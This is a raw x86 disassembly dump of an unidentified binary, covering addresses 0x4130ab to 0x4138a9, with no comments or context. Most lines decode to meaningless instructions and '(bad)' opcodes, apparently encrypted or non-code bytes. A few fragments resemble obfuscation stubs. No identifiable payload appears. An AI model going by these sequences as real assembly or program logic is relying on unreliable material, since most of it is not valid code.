  4130ab:	jo     0x4130a6
  4130ad:	retf   
  4130ae:	xor    BYTE PTR [eax],al
  4130b0:	mov    DWORD PTR [edi+0x1bd065db],edi
  4130b6:	fstp   QWORD PTR [edi+ebx*8]
  4130b9:	popa   
  4130ba:	inc    esi
  4130bb:	clc    
  4130bc:	ret    0x7831
  4130bf:	sti    
  4130c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c1:	adc    esp,0xffffff9e
  4130c4:	ret    
  4130c5:	retf   
  4130c6:	sbb    al,BYTE PTR [esi-0x5]
  4130c9:	cli    
  4130ca:	pop    edx
  4130cb:	imul   BYTE PTR [edx+0x64febfca]
  4130d1:	stos   DWORD PTR es:[edi],eax
  4130d2:	outs   dx,BYTE PTR ds:[esi]
  4130d3:	mov    WORD PTR ds:0x8e2efd63,?
  4130d9:	or     al,0x85
  4130db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130dc:	mov    ebp,DWORD PTR [edi+0x45400926]
  4130e2:	mov    ebx,0x5adf1570
  4130e7:	(bad)  
  4130e8:	les    esi,FWORD PTR [ebx]
  4130ea:	test   al,0xa2
  4130ec:	mov    cl,BYTE PTR [ebp-0x71a133bf]
  4130f2:	rcl    DWORD PTR [ebx+0xf],0x9e
  4130f6:	jle    0x41311c
  4130f8:	sub    BYTE PTR [edx+0x7e],ah
  4130fb:	ins    BYTE PTR es:[edi],dx
  4130fc:	mov    esi,0x4cdb661e
  413101:	ins    DWORD PTR es:[edi],dx
  413102:	fwait
  413103:	pop    es
  413104:	mov    bl,0x95
  413106:	stos   DWORD PTR es:[edi],eax
  413107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413108:	mov    dl,0xb0
  41310a:	add    eax,esp
  41310c:	arpl   WORD PTR [eax],bx
  41310e:	jmp    FWORD PTR [esi+0xffff5b9]
  413114:	mov    al,ds:0x88381003
  413119:	sbb    bl,BYTE PTR [edi+0x1e]
  41311c:	clc    
  41311d:	xchg   ebp,eax
  41311e:	mov    edi,0x3f69bbe0
  413123:	and    esp,DWORD PTR [esp+esi*4-0x1b]
  413127:	dec    esp
  413128:	repz inc BYTE PTR [ebx]
  41312b:	jns    0x413166
  41312d:	and    DWORD PTR [edx],ecx
  41312f:	inc    esp
  413130:	cmp    al,0x29
  413132:	int3   
  413133:	cmp    eax,0x5739e6
  413138:	cmp    edi,esp
  41313a:	jg     0x41310d
  41313c:	nop
  41313d:	call   0x9ccd:0x45c2e5e1
  413144:	test   BYTE PTR [ebp+0x1f],dh
  413147:	ins    BYTE PTR es:[edi],dx
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	out    dx,al
  41317f:	int3   
  413180:	push   esi
  413181:	pop    es
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x4131a0
  41318b:	xlat   BYTE PTR ds:[ebx]
  41318c:	inc    eax
  41318d:	in     eax,dx
  41318e:	les    esp,FWORD PTR [esi-0x2899804f]
  413194:	cmp    DWORD PTR [edi-0x87e71f9],esi
  41319a:	test   DWORD PTR [edi-0x5da95e0d],edx
  4131a0:	cs and eax,0xaa172f06
  4131a6:	add    al,0xe2
  4131a8:	ret    0x2549
  4131ab:	or     BYTE PTR [ecx+0x65d49b76],al
  4131b1:	mov    dl,0x6a
  4131b3:	mov    ds:0x249d434,al
  4131b8:	popa   
  4131b9:	dec    ecx
  4131ba:	cld    
  4131bb:	imul   ecx,DWORD PTR [edx],0xc0b7352d
  4131c1:	outs   dx,DWORD PTR ds:[esi]
  4131c2:	xor    DWORD PTR [edx-0x4],0xb61cfd07
  4131c9:	xor    bl,BYTE PTR [eax]
  4131cb:	ret    
  4131cc:	mov    cl,0xf
  4131ce:	rcl    BYTE PTR [eax+0x48],1
  4131d1:	icebp  
  4131d2:	mul    BYTE PTR [esi+ebx*4+0x6e]
  4131d6:	mov    ebx,0xaf9babe3
  4131db:	pop    eax
  4131dc:	dec    esp
  4131dd:	iret   
  4131de:	mov    ecx,0xcfe4d6d1
  4131e3:	add    DWORD PTR [eax+0x45],esp
  4131e6:	cmp    eax,0x71e7c766
  4131eb:	daa    
  4131ec:	icebp  
  4131ed:	aad    0xaa
  4131ef:	jp     0x41320c
  4131f1:	xchg   DWORD PTR [ebx],edi
  4131f3:	loope  0x41326f
  4131f5:	or     BYTE PTR [bx+si+0x6feb],bh
  4131fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fb:	pop    eax
  4131fc:	xor    edi,DWORD PTR [ebp+ebx*2+0x5e]
  413200:	hlt    
  413201:	jo     0x41318d
  413203:	(bad)
  413206:	jge    0x4131b0
  413208:	lods   eax,DWORD PTR ds:[esi]
  413209:	add    esp,DWORD PTR [ebx-0x307b8ab]
  41320f:	frstor [edi]
  413211:	mov    esp,0xd12d181f
  413216:	(bad)  
  413217:	aas    
  413218:	pop    eax
  413219:	leave  
  41321a:	adc    DWORD PTR [ebx+0x6e],0x2bf0cc5f
  413221:	addr16 inc edi
  413223:	(bad)  
  413225:	dec    ebx
  413226:	jae    0x41325d
  413228:	stc    
  413229:	pop    es
  41322a:	adc    ebp,DWORD PTR [eax+eax*8+0x62b936a4]
  413231:	sub    esi,esp
  413233:	hlt    
  413234:	add    edx,ebp
  413236:	dec    eax
  413237:	mov    DWORD PTR ds:0xb4e87bca,esp
  41323d:	(bad)
  413240:	es shr ah,cl
  413243:	aam    0x2d
  413245:	xchg   esi,eax
  413246:	in     eax,0x67
  413248:	pop    esp
  413249:	outs   dx,BYTE PTR ds:[esi]
  41324a:	hlt    
  41324b:	(bad)  
  41324c:	ss inc ebp
  41324e:	es pop ds
  413250:	xchg   esp,eax
  413251:	lock cmp bl,BYTE PTR [ecx+0x4]
  413255:	aaa    
  413256:	bound  esp,QWORD PTR [edx]
  413258:	mov    ?,WORD PTR [ecx+0x4a6df296]
  41325e:	sar    DWORD PTR [edi-0x61],1
  413261:	shr    DWORD PTR [ebx],0x55
  413264:	mov    al,ds:0x86ff788f
  413269:	push   edi
  41326a:	jmp    0x41322a
  41326c:	xor    al,0x8e
  41326e:	jecxz  0x41326d
  413270:	loop   0x413215
  413272:	push   0xd9e0e9d1
  413277:	xchg   ebp,eax
  413278:	inc    edi
  413279:	enter  0x9422,0x9e
  41327d:	inc    esi
  41327e:	mov    edx,esp
  413280:	daa    
  413281:	pop    ecx
  413282:	rcr    edx,1
  413284:	sub    DWORD PTR [ecx],edi
  413286:	call   DWORD PTR [edi-0x1a]
  413289:	in     al,dx
  41328a:	repnz pop eax
  41328c:	mov    edi,0xee1009c7
  413291:	retf   
  413292:	and    ebp,edi
  413294:	in     al,0x74
  413296:	(bad)  
  413297:	out    dx,eax
  413298:	shl    DWORD PTR [ebx+0x15b43a58],1
  41329e:	mov    esp,0x614b8499
  4132a3:	or     ebp,edx
  4132a5:	adc    al,0xdf
  4132a7:	imul   ecx,DWORD PTR [esi+0x2cd8c6d9],0x53
  4132ae:	xor    ch,BYTE PTR [esi-0x2c3d352a]
  4132b4:	xor    dl,ah
  4132b6:	cs call 0x6ef8:0xdebc02aa
  4132be:	xor    BYTE PTR [edx],bl
  4132c0:	add    eax,0xc0225fc1
  4132c5:	inc    edi
  4132c6:	fcom   QWORD PTR [edx-0x65]
  4132c9:	xor    dl,bh
  4132cb:	inc    eax
  4132cc:	enter  0x5a1f,0x97
  4132d0:	push   ds
  4132d1:	sbb    BYTE PTR [eax-0x9],dl
  4132d4:	inc    ebx
  4132d5:	jae    0x413300
  4132d7:	leave  
  4132d8:	outs   dx,BYTE PTR ds:[esi]
  4132d9:	jmp    0x413328
  4132db:	bound  esp,QWORD PTR [edx]
  4132dd:	jl     0x413309
  4132df:	and    DWORD PTR [ebx+0x63234592],0xe03c8def
  4132e9:	adc    al,0x37
  4132eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ec:	xor    BYTE PTR [edi+eax*2-0x30937789],ch
  4132f3:	dec    ebx
  4132f4:	inc    ecx
  4132f5:	hlt    
  4132f6:	inc    ebp
  4132f7:	ficomp DWORD PTR [esi+0x51]
  4132fa:	ror    DWORD PTR [esi+ebx*2-0x1e89ead9],0x5d
  413302:	jge    0x41329e
  413304:	outs   dx,BYTE PTR ds:[esi]
  413305:	lock jecxz 0x4132f7
  413308:	test   DWORD PTR [ebp+0x6e],ebp
  41330b:	popf   
  41330c:	pop    ebx
  41330d:	out    dx,eax
  41330e:	loop   0x4132b4
  413310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413311:	cmp    BYTE PTR ds:0x4e8fd6fd,cl
  413317:	push   edx
  413318:	sbb    BYTE PTR [eax-0x689fe0d8],ch
  41331e:	les    ebx,FWORD PTR ds:0xbce3c781
  413324:	mov    eax,0xe939347f
  413329:	mov    ebx,0xd58b84f1
  41332e:	mov    dl,0x53
  413330:	jmp    0x200eec51
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	inc    esi
  413337:	push   0xffffffc0
  413339:	add    BYTE PTR [esp+edx*1+0x19],dl
  41333d:	push   cs
  41333e:	(bad)  [ebx]
  413340:	je     0x41333f
  413342:	cmp    al,0x5f
  413344:	dec    edx
  413345:	xor    al,0x7b
  413347:	bound  esp,QWORD PTR [edi]
  413349:	loopne 0x413365
  41334b:	inc    edi
  41334c:	das    
  41334d:	adc    al,0x47
  41334f:	out    dx,al
  413350:	inc    eax
  413351:	dec    ebp
  413352:	inc    edx
  413353:	push   eax
  413354:	aad    0x21
  413356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413357:	push   es
  413358:	jmp    DWORD PTR [eax-0x79]
  41335b:	dec    edx
  41335c:	push   0xcd465de0
  413361:	mov    esi,0x97ffcda9
  413366:	jecxz  0x4133bd
  413368:	push   ebx
  413369:	ja     0x41332e
  41336b:	dec    eax
  41336c:	cs jns 0x4133bc
  41336f:	cmp    BYTE PTR [edx-0x77],al
  413372:	pop    sp
  413374:	inc    edx
  413375:	dec    ecx
  413376:	out    dx,eax
  413377:	lods   al,BYTE PTR ds:[esi]
  413378:	cmp    al,0x38
  41337a:	arpl   WORD PTR [ecx+edx*8+0x7c9b0557],dx
  413381:	xor    ecx,DWORD PTR [ebp-0x1c6dc8ad]
  413387:	mov    esi,0x29701970
  41338c:	pop    edx
  41338d:	dec    ebp
  41338e:	es and al,dh
  413391:	xchg   BYTE PTR [esi+eax*2],dl
  413394:	sbb    al,0xc6
  413396:	mov    esi,0xcbbce382
  41339b:	popf   
  41339c:	lock pop ss
  41339e:	jo     0x4133af
  4133a0:	cmp    al,0x8
  4133a2:	shl    DWORD PTR [ebx],1
  4133a4:	ror    DWORD PTR [ecx+0x1b],1
  4133a7:	mov    dl,0x47
  4133a9:	mov    ecx,0x53a448e6
  4133ae:	push   ebp
  4133af:	or     eax,0x9e716b39
  4133b4:	in     al,dx
  4133b5:	(bad)  
  4133b6:	dec    eax
  4133b7:	and    BYTE PTR [ecx+0x3c9fa586],al
  4133bd:	bound  ecx,QWORD PTR [esi-0x32]
  4133c0:	mov    ebx,0x4064d484
  4133c5:	sbb    eax,0xfe7e9e7c
  4133ca:	nop
  4133cb:	out    dx,eax
  4133cc:	jmp    0x2322:0x372fc002
  4133d3:	pop    ebx
  4133d4:	or     DWORD PTR [esi],esi
  4133d6:	leave  
  4133d7:	ret    0xb2b6
  4133da:	(bad)  
  4133db:	mov    dh,0xd5
  4133dd:	inc    edi
  4133de:	and    eax,0x24d315bd
  4133e3:	pop    ebp
  4133e4:	adc    BYTE PTR ds:0x577d1356,dh
  4133ea:	sbb    bh,BYTE PTR [ecx]
  4133ec:	mov    esp,0x1fac654f
  4133f1:	out    dx,eax
  4133f2:	xchg   ebx,eax
  4133f3:	mov    esp,edx
  4133f5:	lahf   
  4133f6:	dec    esp
  4133f7:	je     0x413414
  4133f9:	push   edi
  4133fa:	ins    BYTE PTR es:[edi],dx
  4133fb:	push   ebx
  4133fc:	mov    ebx,0xfd72efd9
  413401:	int    0x91
  413403:	xchg   ecx,eax
  413404:	jne    0x413425
  413406:	dec    edi
  413407:	jp     0x4133ae
  413409:	rcl    DWORD PTR [edx-0x2b],0x69
  41340d:	xchg   esi,eax
  41340e:	dec    edx
  41340f:	dec    ebp
  413410:	inc    ebp
  413411:	mov    DWORD PTR [ebp-0x2082b0b9],ebx
  413417:	cwde   
  413418:	sbb    BYTE PTR [eax-0x44],bl
  41341b:	ret    
  41341c:	loope  0x413467
  41341e:	adc    al,ch
  413420:	pop    edx
  413421:	mov    eax,0x30d32669
  413426:	leave  
  413427:	or     DWORD PTR [ebx-0x40],edx
  41342a:	ror    BYTE PTR [edi+edi*1-0xd],1
  41342e:	loop   0x4133e9
  413430:	in     eax,0x39
  413432:	add    DWORD PTR [ebx+0x2ce7f717],ebx
  413438:	(bad)
  41343b:	add    BYTE PTR [edx],bh
  41343d:	scas   al,BYTE PTR es:[edi]
  41343e:	jg     0x4133dc
  413440:	(bad)  
  413441:	adc    ch,BYTE PTR [ebx+0x46]
  413444:	popa   
  413445:	push   esp
  413446:	sub    al,0x76
  413448:	dec    DWORD PTR [ecx-0x7c]
  41344b:	repnz test al,0x80
  41344e:	push   ebp
  41344f:	cld    
  413450:	scas   al,BYTE PTR es:[edi]
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xcda5910f,al
  413492:	xor    esp,ebp
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xcc70707e
  41349c:	inc    edi
  41349d:	inc    esp
  41349e:	dec    edx
  41349f:	xor    al,0xf7
  4134a1:	jns    0x41348f
  4134a3:	jo     0x4134f6
  4134a5:	fsub   st(7),st
  4134a7:	xor    dh,BYTE PTR [ebp-0x1a]
  4134aa:	or     BYTE PTR [esi+0x71],bl
  4134ad:	popf   
  4134ae:	cmp    eax,0x38758027
  4134b3:	xor    al,0x16
  4134b5:	xor    ecx,DWORD PTR [eax]
  4134b7:	mov    esp,0xe99362f6
  4134bc:	sub    DWORD PTR [edx],ecx
  4134be:	fwait
  4134bf:	mov    esi,0x94c539
  4134c4:	imul   eax,DWORD PTR [edx+0x7c],0xffffff9d
  4134c8:	mov    eax,0x64d7958e
  4134cd:	repnz imul ebp,eax,0xa
  4134d1:	div    DWORD PTR ds:0xd4ad5aea
  4134d7:	fild   WORD PTR [edi-0x9]
  4134da:	fmul   DWORD PTR [ebp+0x123341c7]
  4134e0:	push   esi
  4134e1:	adc    ch,ah
  4134e3:	sub    BYTE PTR [eax],0x2e
  4134e6:	adc    eax,0x5212f3b2
  4134eb:	jecxz  0x41355b
  4134ed:	in     al,0x29
  4134ef:	jbe    0x413494
  4134f1:	sub    DWORD PTR [ecx-0x2d3143a7],edx
  4134f7:	and    BYTE PTR ds:0x6469f92d,cl
  4134fd:	inc    edi
  4134fe:	je     0x41356b
  413500:	add    DWORD PTR [ebx+0x36],0xe7c6afc5
  413507:	jne    0x4134cb
  413509:	push   eax
  41350a:	or     bh,BYTE PTR [edi]
  41350c:	fsubr  DWORD PTR [edx+ecx*8-0x2]
  413510:	(bad)  
  413511:	in     al,0x2e
  413513:	fcom   QWORD PTR [ebx+0x74966c03]
  413519:	jo     0x413510
  41351b:	add    DWORD PTR [esi],eax
  41351d:	ins    DWORD PTR es:[edi],dx
  41351e:	add    bl,BYTE PTR [edi+eiz*4-0x6873a060]
  413525:	mov    dh,0xc5
  413527:	push   ebp
  413528:	add    cl,BYTE PTR [edi]
  41352a:	mov    eax,ds:0x47347c73
  41352f:	dec    ebx
  413530:	lods   al,BYTE PTR ds:[esi]
  413531:	cmp    eax,0x6948979b
  413536:	std    
  413537:	mov    bh,0x4c
  413539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41353a:	xchg   ecx,eax
  41353b:	test   BYTE PTR [esi],bh
  41353d:	sub    ah,BYTE PTR [edi-0x296ce1c1]
  413543:	cmp    eax,0x68a8bbc4
  413548:	jg     0x4135a3
  41354a:	inc    esp
  41354b:	jg     0x4135c3
  41354d:	call   DWORD PTR [esi]
  41354f:	pop    es
  413550:	push   ebx
  413551:	cmc    
  413552:	out    dx,eax
  413553:	mov    ebx,0x110fae82
  413558:	dec    edi
  413559:	imul   ebx,DWORD PTR [ebp-0x7a3592d3],0x4d8667de
  413563:	xor    ch,0x26
  413566:	dec    ebx
  413567:	enter  0x941b,0x52
  41356b:	jae    0x4135d5
  41356d:	mov    WORD PTR [esi],cs
  41356f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413570:	mov    esp,0xeab3988
  413575:	(bad)  
  413576:	pop    ebx
  413577:	inc    BYTE PTR [edx+0x23c22a87]
  41357d:	test   BYTE PTR [ebp+esi*8+0x55],dh
  413581:	bound  ecx,QWORD PTR [edx]
  413583:	xchg   ebp,eax
  413584:	mov    ds:0xf472e2d3,al
  413589:	pop    edi
  41358a:	pop    ss
  41358b:	sti    
  41358c:	sbb    eax,0x37518b4
  413591:	(bad)  
  413592:	jg     0x413598
  413594:	pop    esp
  413595:	mov    bh,BYTE PTR [edi+0x1e9e0925]
  41359b:	mov    ah,0xb4
  41359d:	iret   
  41359e:	xchg   esp,eax
  41359f:	xchg   ebx,eax
  4135a0:	push   ecx
  4135a1:	sub    al,0x2f
  4135a3:	sbb    esi,eax
  4135a5:	cmc    
  4135a6:	xor    DWORD PTR [ecx-0x280f407c],ebp
  4135ac:	leave  
  4135ad:	mov    edx,0x1ab29e63
  4135b2:	(bad)  [edx]
  4135b4:	mov    edx,0xd3e7466f
  4135b9:	pushf  
  4135ba:	int    0x2e
  4135bc:	(bad)  
  4135bd:	cwde   
  4135be:	inc    eax
  4135bf:	enter  0x3ef3,0xe9
  4135c3:	out    dx,eax
  4135c4:	or     eax,0xfb114e56
  4135c9:	dec    ebp
  4135ca:	jmp    0x3367:0x8816ba90
  4135d1:	push   esp
  4135d2:	mov    ss,ebx
  4135d4:	jmp    0xf29b:0xd17a386a
  4135db:	emms   
  4135dd:	gs jb  0x41364b
  4135e0:	push   cs
  4135e1:	and    bl,dl
  4135e3:	js     0x4135c9
  4135e5:	mov    DWORD PTR [ecx+edx*8+0x9],ecx
  4135e9:	pop    eax
  4135ea:	inc    ebp
  4135eb:	mov    dh,0x42
  4135ed:	retf   
  4135ee:	pushf  
  4135ef:	dec    ecx
  4135f0:	test   al,0xfa
  4135f2:	ds shl edi,cl
  4135f5:	call   0xbaa1:0xabe5f19b
  4135fc:	fdivrp st(1),st
  4135fe:	cmc    
  4135ff:	(bad)
  413603:	(bad)  
  413604:	rcl    BYTE PTR [ebx+0x5b],0x74
  413608:	lahf   
  413609:	and    BYTE PTR [ebp+0x548b94f4],dh
  41360f:	pop    esi
  413610:	mov    ds:0x2b4e3c82,eax
  413615:	ja     0x4135a0
  413617:	and    DWORD PTR [edi-0x6a],ecx
  41361a:	mov    eax,0xaf58a834
  41361f:	popf   
  413620:	(bad)  
  413621:	jp     0x413625
  413623:	push   ds
  413624:	mov    al,0x63
  413626:	inc    eax
  413627:	fdivr  DWORD PTR [ebp-0x6d]
  41362a:	dec    ecx
  41362b:	ja     0x4135b9
  41362d:	into   
  41362e:	arpl   bp,dx
  413630:	push   ss
  413631:	fdiv   DWORD PTR [ebp-0xc]
  413634:	and    ecx,DWORD PTR [esi+eax*2+0x71]
  413638:	ret    0x3437
  41363b:	faddp  st(3),st
  41363d:	and    bh,BYTE PTR [ebx+0x1f0cb8ef]
  413643:	dec    esp
  413644:	pop    ss
  413645:	mov    ah,ch
  413647:	add    edx,DWORD PTR [esi]
  413649:	or     BYTE PTR [esi],bl
  41364b:	rcr    DWORD PTR [ecx+0x6d],cl
  41364e:	sub    eax,0x23be649e
  413653:	sahf   
  413654:	int    0xee
  413656:	shl    eax,1
  413658:	loopne 0x413641
  41365a:	sbb    al,0x6f
  41365c:	mov    ds:0xdb66d70,eax
  413661:	sub    eax,0x94f0db63
  413666:	(bad)  
  413667:	push   cs
  413668:	lahf   
  413669:	fsubp  st(1),st
  41366b:	add    edx,eax
  41366d:	and    BYTE PTR ds:0xdf23e8d5,cl
  413673:	push   ss
  413674:	int    0x8c
  413676:	mov    cl,0x9a
  413678:	mov    bh,0x7
  41367a:	(bad)  
  41367b:	cmp    eax,0xfc8c5f02
  413680:	jmp    0x413673
  413682:	fst    QWORD PTR [ebx-0x18c9e1ec]
  413688:	(bad)
  41368c:	lea    ecx,[eax-0x5c429204]
  413692:	fwait
  413693:	mov    cl,0xd2
  413695:	jo     0x4136e7
  413697:	inc    edi
  413698:	icebp  
  413699:	in     eax,0xd7
  41369b:	fdiv   DWORD PTR [edi-0x2b]
  41369e:	in     al,0x9f
  4136a0:	fdiv   st,st(5)
  4136a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a3:	dec    ebx
  4136a4:	mov    edx,0x43ece64f
  4136a9:	int    0x29
  4136ab:	loope  0x41370d
  4136ad:	retf   
  4136ae:	test   BYTE PTR [edx+0x77],al
  4136b1:	mov    ?,WORD PTR [edx-0x14c33881]
  4136b7:	push   eax
  4136b8:	(bad)  
  4136b9:	and    cl,BYTE PTR ds:0xc5a9aaf3
  4136bf:	push   esp
  4136c0:	xor    eax,DWORD PTR [eax+ebp*1-0x5cb485f7]
  4136c7:	out    0x81,eax
  4136c9:	and    al,0x28
  4136cb:	mov    BYTE PTR [ebx-0x53f11d2d],0x9e
  4136d2:	and    al,0xb2
  4136d4:	pop    edx
  4136d5:	mov    ds,WORD PTR [edi]
  4136d7:	xchg   esp,eax
  4136d8:	sub    al,0xbd
  4136da:	(bad)  
  4136db:	cmp    ebp,ecx
  4136dd:	inc    edi
  4136de:	es jnp 0x41372a
  4136e1:	mov    cl,BYTE PTR [edi+ecx*8+0x2b]
  4136e5:	dec    edi
  4136e6:	shr    BYTE PTR [ecx+0x182f333d],0xcd
  4136ed:	ins    BYTE PTR es:[edi],dx
  4136ee:	pop    edi
  4136ef:	in     al,0xbf
  4136f1:	add    ch,0xba
  4136f4:	addr16 and eax,0x1df86643
  4136fa:	outs   dx,BYTE PTR ds:[esi]
  4136fb:	retf   0x489c
  4136fe:	xchg   ebx,eax
  4136ff:	sub    BYTE PTR [edi-0x7e49e5d0],bl
  413705:	xor    eax,0x303a054f
  41370a:	adc    DWORD PTR [edx-0x6803ca2c],0x60
  413711:	sub    BYTE PTR [ecx],ah
  413713:	(bad)  
  413714:	daa    
  413715:	int3   
  413716:	push   ds
  413717:	dec    edi
  413718:	retf   0x37fd
  41371b:	inc    esp
  41371c:	cmp    cl,BYTE PTR [ecx-0x63]
  41371f:	cmp    BYTE PTR [ecx+0x65],bh
  413722:	add    al,0x9b
  413724:	add    DWORD PTR [ebp+ebx*8+0x46],ebx
  413728:	mov    edi,0xf934a209
  41372d:	scas   eax,DWORD PTR es:[edi]
  41372e:	and    al,0x3f
  413730:	inc    esp
  413731:	cmp    DWORD PTR [ecx],ebx
  413733:	sar    DWORD PTR [edi-0x6b6de55b],0xfe
  41373a:	mov    edi,0xd5fd4740
  41373f:	test   DWORD PTR [edx],eax
  413741:	mov    al,ds:0x2c09bd55
  413746:	(bad)  
  413747:	in     al,0x85
  413749:	inc    edi
  41374a:	mov    bl,0xc
  41374c:	lahf   
  41374d:	add    ebp,edx
  41374f:	mov    edi,0x4e6466eb
  413754:	pusha  
  413755:	inc    ebx
  413756:	mov    ebx,0xaf031ae3
  41375b:	sahf   
  41375c:	fwait
  41375d:	ret    0x6504
  413760:	dec    ebp
  413761:	add    eax,0x850ff83b
  413766:	test   DWORD PTR [edx],ecx
  413768:	add    BYTE PTR [eax],al
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	fdiv   QWORD PTR [esp+ecx*2+0x706b3581]
  413785:	jo     0x413740
  413787:	jle    0x4137f9
  413789:	jo     0x41378d
  41378b:	div    BYTE PTR [ecx-0x67]
  41378e:	push   eax
  41378f:	cmp    al,0x8d
  413791:	and    al,0xd7
  413793:	nop
  413794:	adc    edi,eax
  413796:	hlt    
  413797:	sbb    DWORD PTR [ebp+eiz*8-0x73],esp
  41379b:	nop
  41379c:	fdiv   st,st(5)
  41379e:	fnstenv [edi+esi*4-0x6254a5d8]
  4137a5:	aad    0xbe
  4137a7:	sti    
  4137a8:	fstp   TBYTE PTR [esi]
  4137aa:	scas   eax,DWORD PTR es:[edi]
  4137ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ac:	mov    fs,WORD PTR ds:0x9fd6af14
  4137b2:	xor    eax,0x672fc694
  4137b7:	dec    ecx
  4137b8:	push   ebp
  4137b9:	mov    cl,0x4a
  4137bb:	cld    
  4137bc:	jmp    0x2066:0x38355896
  4137c3:	cmp    bl,BYTE PTR [ecx+0x685a740b]
  4137c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ca:	popa   
  4137cb:	push   edi
  4137cc:	mov    dl,0x43
  4137ce:	xchg   edi,eax
  4137cf:	out    0x1f,al
  4137d1:	push   ebp
  4137d2:	fwait
  4137d3:	pop    ebp
  4137d4:	sbb    ah,cl
  4137d6:	mov    WORD PTR [ecx+0x6d],ss
  4137d9:	push   ebp
  4137da:	xchg   edx,eax
  4137db:	call   0x1284ad41
  4137e0:	iret   
  4137e1:	in     eax,dx
  4137e2:	mov    bl,0xb4
  4137e4:	out    dx,eax
  4137e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e6:	popa   
  4137e7:	stc    
  4137e8:	retf   0x4208
  4137eb:	std    
  4137ec:	lods   al,BYTE PTR ds:[esi]
  4137ed:	jae    0x41380f
  4137ef:	cmp    eax,0x175acf64
  4137f4:	mov    dl,0x4f
  4137f6:	out    dx,eax
  4137f7:	mov    al,dl
  4137f9:	cmp    ah,cl
  4137fb:	add    BYTE PTR [ebx-0x46],ch
  4137fe:	loop   0x413785
  413800:	inc    esp
  413801:	imul   edi,DWORD PTR [edi+eiz*8],0x58
  413805:	mov    eax,ds:0x82d46776
  41380a:	push   ebx
  41380b:	xchg   bh,dl
  41380d:	add    ch,dh
  41380f:	add    BYTE PTR [ebp+0xd],cl
  413812:	push   esp
  413813:	dec    ebx
  413814:	push   ebp
  413815:	xchg   DWORD PTR [eax-0x5a],edx
  413818:	ret    
  413819:	sbb    eax,0x2e33af5c
  41381e:	pusha  
  41381f:	je     0x41388b
  413821:	push   edi
  413822:	fcom   st(1)
  413824:	(bad)  
  413825:	(bad)  
  413826:	jl     0x4137b5
  413828:	jle    0x4138a5
  41382a:	mov    al,ds:0x335a080b
  41382f:	int3   
  413830:	aad    0x63
  413832:	mov    ds:0x54dbb4d3,al
  413837:	jno    0x4137e9
  413839:	and    BYTE PTR [eax-0x5d],bl
  41383c:	jl     0x413823
  41383e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41383f:	retf   
  413840:	jo     0x41384f
  413842:	in     eax,dx
  413843:	fcomp  QWORD PTR [edx]
  413845:	nop    DWORD PTR [edx]
  413848:	imul   edi,ebp,0x1b65348b
  41384e:	aam    0x19
  413850:	or     eax,0x8e0d892d
  413855:	adc    al,0x1f
  413857:	xchg   ecx,eax
  413858:	test   eax,0x2cb0ddc0
  41385d:	pop    ebx
  41385e:	xchg   DWORD PTR [ecx+eiz*8+0x6f],edi
  413862:	in     al,dx
  413863:	aad    0xf8
  413865:	das    
  413866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413867:	int3   
  413868:	jg     0x413824
  41386a:	push   esp
  41386b:	xchg   esp,eax
  41386c:	pop    es
  41386d:	jecxz  0x4138bb
  41386f:	stos   DWORD PTR es:[edi],eax
  413870:	add    eax,0xb300c0fd
  413875:	adc    DWORD PTR [edi],esp
  413877:	imul   edi,DWORD PTR [edx+0x56eabd16],0xb465bcdc
  413881:	push   edx
  413882:	adc    esp,DWORD PTR [eax]
  413884:	lahf   
  413885:	adc    DWORD PTR [edx-0x6f25d9c4],edi
  41388b:	sub    eax,0x3bf50dec
  413890:	pop    ecx
  413891:	(bad)  
  413892:	mov    esi,0xbf1291dc
  413897:	push   cs
  413898:	xchg   DWORD PTR [esi],ecx
  41389a:	(bad)  
  41389b:	adc    ebp,edi
  41389d:	pop    ss
  41389e:	cmp    dh,BYTE PTR [ebp+0x5d2124b3]
  4138a4:	xor    eax,0x55b737e5
  4138a9:	leave  
